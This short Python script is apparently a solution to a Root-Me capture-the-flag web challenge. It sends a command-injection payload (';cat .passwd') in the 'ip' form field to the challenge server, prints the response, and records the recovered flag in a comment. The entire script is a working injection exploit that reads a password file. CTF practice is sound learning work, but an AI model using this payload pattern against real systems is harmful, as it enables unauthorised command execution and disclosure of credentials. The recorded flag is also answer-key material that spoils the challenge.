import requests

payload = ";cat .passwd"
url = "http://challenge01.root-me.org/web-serveur/ch54/"
r = requests.post(url, data={'ip' : '{}'.format(payload)})
print(r.text)
#  flag = S3rv1ceP1n9Sup3rS3cure